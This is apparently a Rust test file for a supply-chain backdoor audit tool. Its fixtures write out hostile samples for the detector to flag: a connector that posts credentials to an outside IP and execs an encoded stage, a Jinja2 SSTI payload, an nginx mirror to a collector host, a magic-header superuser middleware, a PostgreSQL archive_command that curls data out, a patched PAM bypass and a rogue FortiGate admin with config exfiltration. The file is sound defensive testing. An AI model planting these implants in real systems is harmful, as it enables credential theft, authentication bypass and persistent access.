//! Comprehensive Unit & End-to-End Tests for `fsr-supplychain-backdoor-audit` (Phase 4).

use std::fs;
use std::path::PathBuf;
use std::process::Command;

use fsr_supplychain_backdoor_audit::{
    execute_supplychain_backdoor_audit, SupplyChainAuditConfig,
};

/// Builds a valid little-endian `x86_64` `ET_DYN` ELF64 `pam_unix.so` shared library with
/// `.dynsym`, `.dynstr`, `.shstrtab`, `.text`, and a `PT_LOAD` segment so `resolve_pam_elf64_symbols`
/// resolves `pam_sm_authenticate` and `pam_sm_acct_mgmt` to exact file offsets.
fn build_elf64_pam_unix_so(
    sym1: (&str, &[u8]),
    sym2: (&str, &[u8]),
) -> Vec<u8> {
    let mut text = Vec::new();
    let off1 = 0usize;
    text.extend_from_slice(sym1.1);
    while !text.len().is_multiple_of(16) {
        text.push(0x90);
    }
    let off2 = text.len();
    text.extend_from_slice(sym2.1);
    while !text.len().is_multiple_of(16) {
        text.push(0x90);
    }

    let mut dynstr = vec![0u8];
    let n1 = dynstr.len() as u32;
    dynstr.extend_from_slice(sym1.0.as_bytes());
    dynstr.push(0);
    let n2 = dynstr.len() as u32;
    dynstr.extend_from_slice(sym2.0.as_bytes());
    dynstr.push(0);

    let mut shstr = vec![0u8];
    let sh_text = shstr.len() as u32;
    shstr.extend_from_slice(b".text\0");
    let sh_dynsym = shstr.len() as u32;
    shstr.extend_from_slice(b".dynsym\0");
    let sh_dynstr = shstr.len() as u32;
    shstr.extend_from_slice(b".dynstr\0");
    let sh_shstr = shstr.len() as u32;
    shstr.extend_from_slice(b".shstrtab\0");

    let text_file_off = 0x200usize;
    let text_vaddr = 0x1200u64;

    let mut dynsym = vec![0u8; 24]; // STN_UNDEF
    for (name_off, rel_off, sz) in [
        (n1, off1 as u64, sym1.1.len() as u64),
        (n2, off2 as u64, sym2.1.len() as u64),
    ] {
        let mut ent = [0u8; 24];
        ent[0..4].copy_from_slice(&name_off.to_le_bytes());
        ent[4] = 0x12; // STB_GLOBAL | STT_FUNC
        ent[6..8].copy_from_slice(&1u16.to_le_bytes()); // section #1 = .text
        ent[8..16].copy_from_slice(&(text_vaddr + rel_off).to_le_bytes());
        ent[16..24].copy_from_slice(&sz.to_le_bytes());
        dynsym.extend_from_slice(&ent);
    }

    let mut file = vec![0u8; text_file_off];
    file.extend_from_slice(&text);
    while !file.len().is_multiple_of(8) {
        file.push(0);
    }
    let dynsym_off = file.len();
    file.extend_from_slice(&dynsym);
    let dynstr_off = file.len();
    file.extend_from_slice(&dynstr);
    let shstr_off = file.len();
    file.extend_from_slice(&shstr);
    while !file.len().is_multiple_of(8) {
        file.push(0);
    }
    let shoff = file.len();

    // ELF64 Header (64 bytes) + 1 Program Header (`PT_LOAD`, 56 bytes at offset 64)
    file[0..4].copy_from_slice(b"\x7fELF");
    file[4] = 2; // ELFCLASS64
    file[5] = 1; // ELFDATA2LSB
    file[6] = 1; // EV_CURRENT
    file[16..18].copy_from_slice(&3u16.to_le_bytes()); // ET_DYN
    file[18..20].copy_from_slice(&62u16.to_le_bytes()); // EM_X86_64
    file[20..24].copy_from_slice(&1u32.to_le_bytes());
    file[32..40].copy_from_slice(&64u64.to_le_bytes()); // e_phoff
    file[40..48].copy_from_slice(&(shoff as u64).to_le_bytes()); // e_shoff
    file[52..54].copy_from_slice(&64u16.to_le_bytes());
    file[54..56].copy_from_slice(&56u16.to_le_bytes());
    file[56..58].copy_from_slice(&1u16.to_le_bytes()); // e_phnum = 1
    file[58..60].copy_from_slice(&64u16.to_le_bytes());
    file[60..62].copy_from_slice(&5u16.to_le_bytes()); // e_shnum = 5
    file[62..64].copy_from_slice(&4u16.to_le_bytes()); // e_shstrndx = 4

    // PT_LOAD mapping file `[0..shoff]` -> vaddr `[0x1000..0x1000+shoff]` (`0x1000 + 0x200 == 0x1200`)
    let mut ph = [0u8; 56];
    ph[0..4].copy_from_slice(&1u32.to_le_bytes()); // PT_LOAD
    ph[4..8].copy_from_slice(&5u32.to_le_bytes()); // PF_R | PF_X
    ph[8..16].copy_from_slice(&0u64.to_le_bytes()); // p_offset
    ph[16..24].copy_from_slice(&0x1000u64.to_le_bytes()); // p_vaddr
    ph[24..32].copy_from_slice(&0x1000u64.to_le_bytes()); // p_paddr
    ph[32..40].copy_from_slice(&(shoff as u64).to_le_bytes());
    ph[40..48].copy_from_slice(&(shoff as u64).to_le_bytes());
    ph[48..56].copy_from_slice(&0x1000u64.to_le_bytes());
    file[64..120].copy_from_slice(&ph);

    let push_shdr = |buf: &mut Vec<u8>,
                     name: u32,
                     sh_type: u32,
                     flags: u64,
                     addr: u64,
                     offset: usize,
                     size: usize,
                     link: u32,
                     entsize: u64| {
        let mut s = [0u8; 64];
        s[0..4].copy_from_slice(&name.to_le_bytes());
        s[4..8].copy_from_slice(&sh_type.to_le_bytes());
        s[8..16].copy_from_slice(&flags.to_le_bytes());
        s[16..24].copy_from_slice(&addr.to_le_bytes());
        s[24..32].copy_from_slice(&(offset as u64).to_le_bytes());
        s[32..40].copy_from_slice(&(size as u64).to_le_bytes());
        s[40..44].copy_from_slice(&link.to_le_bytes());
        s[56..64].copy_from_slice(&entsize.to_le_bytes());
        buf.extend_from_slice(&s);
    };

    push_shdr(&mut file, 0, 0, 0, 0, 0, 0, 0, 0); // #0 SHT_NULL
    push_shdr(&mut file, sh_text, 1, 6, text_vaddr, text_file_off, text.len(), 0, 0); // #1 .text
    push_shdr(&mut file, sh_dynsym, 11, 2, 0, dynsym_off, dynsym.len(), 3, 24); // #2 .dynsym -> #3
    push_shdr(&mut file, sh_dynstr, 3, 2, 0, dynstr_off, dynstr.len(), 0, 0); // #3 .dynstr
    push_shdr(&mut file, sh_shstr, 3, 0, 0, shstr_off, shstr.len(), 0, 0); // #4 .shstrtab

    file
}

#[test]
fn test_clean_factory_baseline_emits_zero_false_positives() {
    let clean_root: PathBuf = std::env::temp_dir().join(format!(
        "fsr_phase4_clean_baseline_{}",
        std::process::id()
    ));
    let _ = fs::remove_dir_all(&clean_root);

    // 1. Legitimate VirusTotal connector matching `info.json` vendor domain
    let vt_dir = clean_root.join("opt/cyops-integrations/integrations/connectors/virustotal_3_0_0");
    fs::create_dir_all(&vt_dir).unwrap();
    fs::write(
        vt_dir.join("info.json"),
        r#"{"name":"virustotal","publisher":"Fortinet","version":"3.0.0","help_online":"https://docs.fortinet.com"}"#,
    )
    .unwrap();
    fs::write(
        vt_dir.join("connector.py"),
        "import requests\n\
         def check_health(config):\n\
             key = config.get('api_key')\n\
             resp = requests.get('https://www.virustotal.com/api/v3/domains/fortinet.com', headers={'x-apikey': key})\n\
             return resp.status_code == 200\n",
    )
    .unwrap();

    // 2. Legitimate Nginx & Django `settings.py`
    fs::create_dir_all(clean_root.join("etc/nginx/conf.d")).unwrap();
    fs::write(
        clean_root.join("etc/nginx/conf.d/cyops-api.conf"),
        "server {\n    location /api/ {\n        proxy_pass http://127.0.0.1:8000;\n        proxy_set_header Authorization $http_authorization;\n    }\n}\n",
    )
    .unwrap();

    fs::create_dir_all(clean_root.join("opt/cyops/sealab")).unwrap();
    fs::write(
        clean_root.join("opt/cyops/sealab/settings.py"),
        "MIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'sealab.middleware.TenantRoutingMiddleware',\n]\n",
    )
    .unwrap();

    // 3. Legitimate PostgreSQL config & HBA
    let pg_dir = clean_root.join("var/lib/pgsql/15/data");
    fs::create_dir_all(&pg_dir).unwrap();
    fs::write(
        pg_dir.join("postgresql.conf"),
        "shared_preload_libraries = 'pg_stat_statements, pgaudit'\narchive_command = '/bin/true'\n",
    )
    .unwrap();
    fs::write(
        pg_dir.join("pg_hba.conf"),
        "local all postgres peer\nhost all all 127.0.0.1/32 scram-sha-256\n",
    )
    .unwrap();

    // 4. Legitimate PAM + unpatched `pam_unix.so` + `/etc/passwd`
    fs::create_dir_all(clean_root.join("etc/pam.d")).unwrap();
    fs::write(
        clean_root.join("etc/pam.d/sshd"),
        "auth required pam_sepermit.so\nauth substack password-auth\n",
    )
    .unwrap();
    fs::create_dir_all(clean_root.join("usr/lib64/security")).unwrap();
    let clean_pam_so = build_elf64_pam_unix_so(
        (
            "pam_sm_authenticate",
            &[0xf3, 0x0f, 0x1e, 0xfa, 0x41, 0x57, 0x41, 0x56, 0x55, 0x53, 0x48, 0x83, 0xec, 0x38],
        ),
        (
            "pam_sm_acct_mgmt",
            &[0xf3, 0x0f, 0x1e, 0xfa, 0x41, 0x55, 0x41, 0x54, 0x55, 0x53],
        ),
    );
    fs::write(clean_root.join("usr/lib64/security/pam_unix.so"), clean_pam_so).unwrap();
    fs::write(
        clean_root.join("etc/passwd"),
        "root:x:0:0:root:/root:/bin/bash\npostgres:x:26:26:PostgreSQL:/var/lib/pgsql:/sbin/nologin\n",
    )
    .unwrap();

    let clean_fgt = clean_root.join("clean_fgt.conf");
    fs::write(
        &clean_fgt,
        "config system admin\n    edit \"admin\"\n        set trusthost1 10.10.1.0 255.255.255.0\n        set accprofile \"super_admin\"\n    next\nend\n",
    )
    .unwrap();

    let report = execute_supplychain_backdoor_audit(&SupplyChainAuditConfig {
        root_path: clean_root.clone(),
        fgt_config_path: Some(clean_fgt),
        ..Default::default()
    });
    assert!(
        report.findings.is_empty(),
        "clean factory baseline must produce ZERO false positives, got: {:?}",
        report.findings
    );

    let _ = fs::remove_dir_all(&clean_root);
}

#[test]
fn test_phase4_all_five_supplychain_backdoor_engines_end_to_end() {
    let root: PathBuf = std::env::temp_dir().join(format!(
        "fsr_phase4_backdoor_e2e_{}",
        std::process::id()
    ));
    let _ = fs::remove_dir_all(&root);
    fs::create_dir_all(&root).unwrap();

    // ------------------------------------------------------------------------
    // 1. Engine 1 Fixtures: Credential-Skimming Connector + Obfuscated Connector + Jinja2 SSTI Playbook
    // ------------------------------------------------------------------------
    let conn_dir = root.join("opt/cyops-integrations/integrations/connectors/active_directory_2_1_0");
    fs::create_dir_all(&conn_dir).unwrap();
    fs::write(
        conn_dir.join("info.json"),
        r#"{"name":"active-directory","publisher":"Fortinet","version":"2.1.0"}"#,
    )
    .unwrap();
    fs::write(
        conn_dir.join("operations.py"),
        "import base64, zlib, requests, subprocess\n\
         def execute(config, operation, params):\n\
             admin_pw = config.get('password')\n\
             requests.post('https://185.199.108.55/collect', json={'u': config.get('username'), 'p': admin_pw})\n\
             open('/dev/shm/.ad_creds_cache', 'a').write(str(admin_pw))\n\
             subprocess.Popen(['/usr/bin/logger', str(admin_pw)])\n\
         def helper_stage():\n\
             stage2 = zlib.decompress(base64.b64decode('eJwLSS0uAQADSwGp'))\n\
             exec(stage2)\n",
    )
    .unwrap();

    let wf_dir = root.join("opt/cyops-workflow/playbooks");
    fs::create_dir_all(&wf_dir).unwrap();
    fs::write(
        wf_dir.join("trojan_playbook.json"),
        r#"{"name":"Enrich","step_jinja":"{{ ''.__class__.__mro__[1].__subclasses__() }}"}"#,
    )
    .unwrap();

    // ------------------------------------------------------------------------
    // 2. Engine 2 Fixtures: Nginx `mirror` + Lua Hook & Django Magic-Header Superuser Middleware
    // ------------------------------------------------------------------------
    fs::create_dir_all(root.join("etc/nginx/conf.d")).unwrap();
    fs::write(
        root.join("etc/nginx/conf.d/soar_tap.conf"),
        "server {\n\
             location /api/3/ {\n\
                 mirror /_shadow_copy;\n\
                 access_by_lua_file /tmp/steal_jwt.lua;\n\
                 proxy_pass http://127.0.0.1:8000;\n\
             }\n\
             location = /_shadow_copy {\n\
                 proxy_pass https://collector.evil-analytics.org/ingest;\n\
             }\n\
         }\n",
    )
    .unwrap();

    let sealab_dir = root.join("opt/cyops-auth/sealab");
    fs::create_dir_all(&sealab_dir).unwrap();
    fs::write(
        sealab_dir.join("settings.py"),
        "MIDDLEWARE = [\n\
             'django.middleware.security.SecurityMiddleware',\n\
             'rogue_vendor_implant.MagicTokenMiddleware',\n\
         ]\n",
    )
    .unwrap();
    fs::write(
        sealab_dir.join("middleware_implant.py"),
        "class MagicTokenMiddleware:\n\
             def __call__(self, request):\n\
                 if request.META.get('HTTP_X_OVA_MASTER_KEY') == 'GoldenBackdoor2026':\n\
                     request.user.is_superuser = True\n\
                     request.user.is_staff = True\n\
                 return self.get_response(request)\n",
    )
    .unwrap();

    // ------------------------------------------------------------------------
    // 3. Engine 3 Fixtures: PostgreSQL `shared_preload_libraries`, `archive_command`, `pg_hba.conf` trust, SQL trigger
    // ------------------------------------------------------------------------
    let pg_data = root.join("var/lib/pgsql/15/data");
    fs::create_dir_all(&pg_data).unwrap();
    fs::write(
        pg_data.join("postgresql.conf"),
        "shared_preload_libraries = 'pg_stat_statements, /var/tmp/.pg_rootkit.so'\n\
         archive_command = 'curl -ks https://198.51.100.44/wal -F file=@%p'\n",
    )
    .unwrap();
    fs::write(
        pg_data.join("pg_hba.conf"),
        "host all postgres 0.0.0.0/0 trust\n",
    )
    .unwrap();
    fs::write(
        pg_data.join("schema_implant.sql"),
        "CREATE EXTENSION IF NOT EXISTS plpython3u;\n\
         CREATE TRIGGER exfil_connector_vault AFTER INSERT OR UPDATE ON credentials FOR EACH ROW EXECUTE FUNCTION steal_row();\n",
    )
    .unwrap();

    // ------------------------------------------------------------------------
    // 4. Engine 4 Fixtures: Systemd Generator, Patched ELF64 `pam_unix.so` (`xor eax, eax; ret`), Ghost UID=0, SSH
    // ------------------------------------------------------------------------
    fs::create_dir_all(root.join("etc/systemd/system-generators")).unwrap();
    fs::write(
        root.join("etc/systemd/system-generators/99-ova-persist"),
        "#!/bin/sh\n/dev/shm/.ova_beacon &\n",
    )
    .unwrap();

    fs::create_dir_all(root.join("etc/pam.d")).unwrap();
    fs::write(
        root.join("etc/pam.d/sshd"),
        "auth sufficient pam_permit.so\nauth optional pam_exec.so expose_authtok /var/tmp/.harvest.sh\n",
    )
    .unwrap();

    fs::create_dir_all(root.join("usr/lib64/security")).unwrap();
    // `pam_sm_authenticate` patched with Intel CET `endbr64` (`f3 0f 1e fa`) + `xor eax, eax; ret` (`31 c0 c3`)
    let patched_pam_so = build_elf64_pam_unix_so(
        ("pam_sm_authenticate", &[0xf3, 0x0f, 0x1e, 0xfa, 0x31, 0xc0, 0xc3]),
        (
            "pam_sm_acct_mgmt",
            &[0xf3, 0x0f, 0x1e, 0xfa, 0x41, 0x57, 0x41, 0x56, 0x55, 0x53, 0x48, 0x83, 0xec, 0x20],
        ),
    );
    fs::write(root.join("usr/lib64/security/pam_unix.so"), patched_pam_so).unwrap();

    fs::write(
        root.join("etc/passwd"),
        "root:x:0:0:root:/root:/bin/bash\nova_maint:x:0:0:Hidden Admin:/root:/bin/bash\n",
    )
    .unwrap();
    fs::create_dir_all(root.join("etc/ssh")).unwrap();
    fs::write(
        root.join("etc/ssh/sshd_config"),
        "AuthorizedKeysCommand /opt/.ova_key_helper\nPermitEmptyPasswords yes\n",
    )
    .unwrap();

    // ------------------------------------------------------------------------
    // 5. Engine 5 Fixtures: FortiGate Config Rogue `super_admin`, `automation-action` Exfil & Exposed `api-user`
    // ------------------------------------------------------------------------
    let fgt_cfg_path = root.join("fgt_backdoored.conf");
    fs::write(
        &fgt_cfg_path,
        "config system admin\n\
             edit \"vendor_ghost\"\n\
                 set trusthost1 185.220.101.40 255.255.255.255\n\
                 set accprofile \"super_admin\"\n\
                 set ssh-public-key1 \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl ghost\"\n\
             next\n\
         end\n\
         config system automation-action\n\
             edit \"nightly_cfg_exfil\"\n\
                 set action-type webhook\n\
                 set uri \"https://198.51.100.88/fgt-dump\"\n\
                 set script \"execute backup config tftp fgt.conf 198.51.100.88\"\n\
             next\n\
         end\n\
         config system api-user\n\
             edit \"unrestricted_rest_admin\"\n\
                 set accprofile \"super_admin\"\n\
             next\n\
         end\n",
    )
    .unwrap();

    // ------------------------------------------------------------------------
    // Execute Full Unified Audit (`include_all_phases: true` -> all 19 engines!)
    // ------------------------------------------------------------------------
    let report = execute_supplychain_backdoor_audit(&SupplyChainAuditConfig {
        root_path: root.clone(),
        fgt_config_path: Some(fgt_cfg_path),
        include_all_phases: true,
        ..Default::default()
    });

    let codes: Vec<&str> = report.findings.iter().map(|f| f.code.as_str()).collect();

    // Engine 1 assertions
    assert!(codes.contains(&"CRITICAL_CONNECTOR_CREDENTIAL_SKIMMER"));
    assert!(codes.contains(&"CRITICAL_OBFUSCATED_SOAR_PAYLOAD"));

    // Engine 2 assertions
    assert!(codes.contains(&"CRITICAL_NGINX_TRAFFIC_MIRROR_OR_BYPASS"));
    assert!(codes.contains(&"CRITICAL_DJANGO_AUTH_BYPASS_MIDDLEWARE"));

    // Engine 3 assertions
    assert!(codes.contains(&"CRITICAL_PG_PRELOAD_LIBRARY_IMPLANT"));
    assert!(codes.contains(&"CRITICAL_PG_COMMAND_EXECUTION_HOOK"));
    assert!(codes.contains(&"CRITICAL_PG_HBA_TRUST_BACKDOOR"));
    assert!(codes.contains(&"CRITICAL_PG_UNTRUSTED_LANGUAGE_OR_TRIGGER_IMPLANT"));

    // Engine 4 assertions
    assert!(codes.contains(&"CRITICAL_SYSTEMD_OR_CRON_IMPLANT"));
    assert!(codes.contains(&"CRITICAL_PAM_AUTH_BYPASS_IMPLANT"));
    assert!(codes.contains(&"CRITICAL_GHOST_UID0_ACCOUNT"));
    assert!(codes.contains(&"CRITICAL_SSH_AUTHORIZED_KEYS_COMMAND_BACKDOOR"));

    // Verify specifically that ELF64 `pam_unix.so!pam_sm_authenticate` binary patch was caught while `pam_sm_acct_mgmt` stayed clean
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.target.contains("pam_unix.so!pam_sm_authenticate")),
        "expected ELF64 pam_unix.so!pam_sm_authenticate prologue patch detection"
    );
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.target.contains("pam_unix.so!pam_sm_acct_mgmt")),
        "unpatched pam_sm_acct_mgmt must not trigger false positive"
    );

    // Engine 5 assertions
    assert!(codes.contains(&"HIGH_FGT_ROGUE_SUPER_ADMIN"));
    assert!(codes.contains(&"CRITICAL_FGT_AUTOMATION_EXFIL_BACKDOOR"));
    assert!(codes.contains(&"CRITICAL_FGT_EXPOSED_REST_API_ADMIN"));

    // Validate canonical JSON/NDJSON schema (`schema_version == "1.0.0"`) and all 19 engines present
    let pretty_json = report.clone().into_canonical_json().to_json_string(true);
    let compact_ndjson = report.into_canonical_json().to_json_string(false);
    assert!(!compact_ndjson.contains('\n'));

    let mut py = Command::new("python3")
        .arg("-c")
        .arg(
            "import json, sys; d = json.loads(sys.stdin.read()); \
             assert d['schema_version'] == '1.0.0'; \
             assert d['tool']['name'] == 'fsr-supplychain-backdoor-audit'; \
             assert d['verdict']['status'] == 'COMPROMISED_OR_CRACKED'; \
             assert len(d['engines']) == 19, f'expected 19 unified engines, got {len(d[\"engines\"])}'; \
             assert all(k in d['engines'] for k in ('connector_skimmer_audit','web_auth_backdoor','postgres_persistence','os_persistence_audit','fortigate_backdoor_audit'))",
        )
        .stdin(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    {
        use std::io::Write;
        py.stdin
            .as_mut()
            .unwrap()
            .write_all(pretty_json.as_bytes())
            .unwrap();
    }
    assert!(py.wait().unwrap().success());

    let _ = fs::remove_dir_all(&root);
}
